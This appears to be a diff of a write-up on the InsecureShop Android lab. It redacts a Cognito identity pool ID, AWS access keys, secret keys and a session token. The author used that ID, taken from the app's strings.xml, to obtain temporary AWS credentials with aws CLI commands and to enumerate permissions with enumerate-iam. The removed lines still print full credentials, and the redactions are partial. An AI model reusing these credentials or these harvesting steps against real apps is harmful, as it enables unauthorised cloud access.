@@ -1510,7 +1510,7 @@ AWS Cognito is an Amazon Web Service that provides authentication, authorization
 At the beginning, I searched for the hardcoded credentials with `Jadx-gui` and it was embedded in the strings.xml file.
 
 ```
-us-east-1:7e9426f7-42af-4717-8689-00a9a4b65c1c
+us-east-1:7e9426f7-******-8689-00a9a4b65c1c
 ```
 
 ![image.png](/assets/InsecureShop/image%2023.png)
@@ -1520,20 +1520,20 @@ So what we have is an `aws_Identity_pool_ID` we can use it to get temporary acce
 ```bash
 # Getting the Identity ID
 ┌──(root㉿kali)-[~]
-└─$ aws cognito-identity get-id --identity-pool-id us-east-1:7e9426f7-42af-4717-8689-00a9a4b65c1c --region us-east-1 
+└─$ aws cognito-identity get-id --identity-pool-id us-east-1:7e9426f7-*****8689-00a9a4b65c1c --region us-east-1 
 {
-    "IdentityId": "us-east-1:15f0125a-1ff0-cd42-4f0a-43cd212fed35"
+    "IdentityId": "us-east-1:15f0125a-*****-4f0a-43cd212fed35"
 }
  
 # Getting temporary creds                        
 ┌──(root㉿kali)-[~]
-└─$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:15f0125a-1ff0-cd42-4f0a-43cd212fed35 --region us-east-1
+└─$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:15f0125a-*****-4f0a-43cd212fed35 --region us-east-1
 {
-    "IdentityId": "us-east-1:15f0125a-1ff0-cd42-4f0a-43cd212fed35",
+    "IdentityId": "us-east-1:15f0125a-1ff0-*****-43cd212fed35",
     "Credentials": {
-        "AccessKeyId": "ASIARL4ASLIP5HH7HNH6",
-        "SecretKey": "oOerELpzDEqLGiBAFObijzATBYkFC1IILP9aJN5k",
-        "SessionToken": "IQoJb3JpZ2luX2VjENf//////////wEaCXVzLWVhc3QtMSJHMEUCIQCRAYtyg6oD/f1nl9ggTLwIt8fwxwu5SEshwJlc7YOidAIgHR6cNq7EYIvelj9qyImsVLDngTKnvJOVkQTht7g6t5Yq0QUI8P//////////ARAEGgwwOTQyMjIwNDc3NzUiDIZoCZtk4HTYp50wGSqlBeRK/0qxHAdAEpnCFvSUGzVx2XIfQsZ58ZqxzB4wsHfLZqx16iWLkUpKTBNnQD/ewZIT4ex0WPSfoG/EHQVsN2BZ1cf8FY4xR/cszc6qFjSgEDUaODXpr2No1ff7F74OPnv4kT9r9MFbH1hTlF/vFbUfYSBIEhovpXEAN2ya5y3CWK0EKhtozJqAiC0BQz2XE1NQBxcsOowmS4p5dBO6kH2PNZR+p97p6XHyIH2vOCwt3XElxfrPqvrQxN22TOaoAqiqVzbZsnoK14CsVvKa5t1WUsSHcekj+vdelZbPLg6tH9iaXC73BzPxJcd0yLD2S+Q0c1mB3v7VDuJsUinv6VD1kMhUZ02KSAH0i2PKcmT7pbYNphpjaCsNENcSATENroqzjdfXoNXvUqVI+dKmDUyGo3dyqnLMnKqoiEGzggg/5Xy2whdEkr6q/11deD/YTXi8IR5oNLJXAcTmhuC7AkcSlD3WJ3ymp/3QVPkc41sOVXjklesUW+pCoI7cn+v5ATXsz+Qr8pwhHwIBvUQvNZ3JbE5383JTVAhMyaQFfTB1NbOT4WDxMLNvDg44932jfZm7Lw0dpAtVPD9QtBFyt+oH+YYxv3XhaghykbT5kCZYo4ugz9blpnrOO+nOl7MbgOSnKA89jpFHRpnLe6EFPx1Zuf+2tgqXdi5t61EcF6D1KRkxBpUweIj+1Ez9ugH6w9GVil2PywM4tE4PdSgKuxhfH+RXRAE9KcIn0aSGJTgoigr9MOrg39JwttxVqX6sm/LRWZGjCXlGSKPU3sxVsd0MiCqFSSViiM1KxBW1/VPtuV9k5pbIdyCyr3qtAt58MI+lPwHmpKoM4oaduaxSRhBzFVZlsdiOGZw40NTZGBZvqLvlFlIy4PbBliYeEWoeGaSYZXwlMJmH57YGOt4CGZ4r/bA/xVBAcEAVuDbKM1S9qwgc9QPLk/i9/dJ+GaGSJ3xBCscAtoNMXDq8c04JINWaLOkagKmjZes9Qh5mOTt5rwTQvtGGudelw79z1y7GIj7jXefIXHzhLhvjVv3TSZ0j01Rty7PusXz8C2sLAwCFYVyPuQdl/BjCLtr48aCscVbvi22u/EIbaieXHn/se7YGJoX32NUVwWl+uxs+AkaytKZwzKLh2wJSpvCE/7ei5cXCw8Q3BPgUwGgB12kBSIsqXF5CdnKgTn0kA+KgUyarNyU6HPz/atnf0dUksebFCTfxB7h94Z7qBcc0KUEPwq7tJTdASbpjgxM7yHpQ5A+aWb5sjH6XfvO5gGKb0Uc0hJiFRP2oEefdTWxlBtMQ/HC8iFHOzFvrqWniLwSFaHnf02yckad/Xd57um+dm1RqDb9Qz3LTQ4x393NHk8wrT0oFWBVuS7hGAzBeg4k=",
+        "AccessKeyId": "ASIARL4*****HNH6",
+        "SecretKey": "oOerEL*****ATBYkFC1IILP9aJN5k",
+        "SessionToken": "IQoJb3JpZ2luX2VjENf//////////wEaCXVzLWVhc3QtMSJHMEUCIQCRAYtyg6oD/*****",
         "Expiration": "2024-09-05T18:43:37+03:00"
     }
 }
@@ -1548,7 +1548,7 @@ So now we have a temporary credential. But we need to know what we can use these
 ┌──(root㉿kali)-[/opt/enumerate-iam]
 └─$ pip3 install -r requirements.txt
 ┌──(root㉿kali)-[/opt/enumerate-iam]
-└─$ python3 enumerate-iam.py --access-key ASIARL4ASLIPQ57WJBZK --secret-key zMCS+52lj8PfUUTwkLHKMXJp6QRgFG6fp2osMt1R 
+└─$ python3 enumerate-iam.py --access-key ASIARL*****Q57WJBZK --secret-key zMCS+52lj8PfUUTwk*****p2osMt1R 
 ```
 
 Unfortunately the command was stuck after running, and my thinking is that the session token is being expired, so I had to create a script to automate this process.
@@ -1597,7 +1597,7 @@ def update_aws_credentials(access_key, secret_key, session_token):
         f.write(f"aws_session_token = {session_token}\n")
 
 # Step 1: Get Identity ID
-identity_pool_id = "us-east-1:7e9426f7-42af-4717-8689-00a9a4b65c1c"
+identity_pool_id = "us-east-1:7e9426f7-42af-*****-8689-00a9a4b65c1c"
 command1 = [
     "aws", "cognito-identity", "get-id",
     "--identity-pool-id", identity_pool_id,
@@ -1641,8 +1641,8 @@ else:
 
 Let’s explain what is doing:
 
-- getting the Get Identity ID from the command  `aws cognito-identity get-id --identity-pool-id us-east-1:7e9426f7-42af-4717-8689-00a9a4b65c1c --region us-east-1`
-- Passing it to the `aws cognito-identity get-credentials-for-identity --identity-id us-east-1:15f0125a-1ff0-cd42-4f0a-43cd212fed35 --region us-east-1` command and get the session and access_key.
+- getting the Get Identity ID from the command  `aws cognito-identity get-id --identity-pool-id us-east-1:7e9426f7-42af-*****-8689-00a9a4b65c1c --region us-east-1`
+- Passing it to the `aws cognito-identity get-credentials-for-identity --identity-id us-east-1:15f0125a-1ff0-*****-4f0a-43cd212fed35 --region us-east-1` command and get the session and access_key.
 - Then, pass all these info to the `enumerate-iam.py`tool and getting the output.
 
 ```bash
